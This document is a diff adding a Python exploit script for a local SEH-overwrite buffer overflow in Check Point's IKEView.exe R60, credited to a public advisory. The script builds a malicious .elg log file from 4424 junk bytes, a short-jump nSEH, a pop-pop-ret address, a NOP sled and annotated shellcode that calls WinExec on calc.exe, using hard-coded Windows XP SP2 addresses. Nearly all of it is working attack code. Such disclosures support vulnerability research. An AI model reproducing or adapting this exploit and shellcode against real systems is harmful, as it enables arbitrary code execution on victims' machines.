@@ -1,0 +1,45 @@
+# Exploit Title: IKEView.exe R60 localSEH Exploit
+# Date: 17/09/2015
+# Exploit Author: cor3sm4sh3r
+# Author email: cor3sm4sh3r[at]gmail.com
+# Contact: https://in.linkedin.com/pub/shravan-kumar-ceh-oscp/103/414/450
+# Category: Local
+
+#[+] Gr337z: hyp3rlinx for finding the bug
+#[+] Source:
+#http://hyp3rlinx.altervista.org/advisories/AS-IKEVIEWR60-0914.txt
+# exploit as been tested on win XP professional sp2 
+ 
+ 
+ 
+#Vendor:
+#================================
+#www.checkpoint.com
+#http://pingtool.org/downloads/IKEView.exe
+
+
+#!/usr/bin/env python
+file="IKEView.elg"
+x=open(file,"w")
+nseh = "\x90\x90\xeb\x32" #short jump
+seh = "\xc0\x28\x40\x00" #pop pop ret
+nopsled = "\x90"*50
+#badchars += "\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
+
+buf  = "\x33\xc0"             #=> XOR EAX,EAX          |  Zero out EAX register
+buf += "\x50"                 #=> PUSH EAX             |  Push EAX to have null-byte padding for "calc.exe"
+buf += "\x68\x2E\x65\x78\x65" #=> PUSH ".exe"          |  Push The ASCII string to the stack
+buf += "\x68\x63\x61\x6C\x63" #=> PUSH "calc"          |
+buf += "\x8B\xC4"             #=> MOV EAX,ESP          |  Put a pointer to the ASCII string in EAX
+buf += "\x6A\x01"             #=> PUSH 1               |  Push uCmdShow parameter to the stack
+buf += "\x50"                 #=> PUSH EAX             |  Push the pointer to lpCmdLine to the stack
+buf += "\xBB\x4d\x11\x86\x7C" #=> MOV EBX,7C86114d     |  Move the pointer to WinExec() into EBX
+buf += "\xFF\xD3"             #=> CALL EBX    
+buf += "\x33\xc0"             #=> XOR EAX,EAX          |  Zero out EAX register
+buf += "\x50"                 #=> PUSH EAX             |  Push EAX
+buf += "\xBB\xa2\xca\x81\x7c" #=> MOV EBX,7C81caa2     |  Exit process
+buf += "\xFF\xD3"             #=> CALL EBX
+junk = "A"*(4424)
+payload = junk + nseh + seh + nopsled + buf
+x.write(payload)
+x.close()
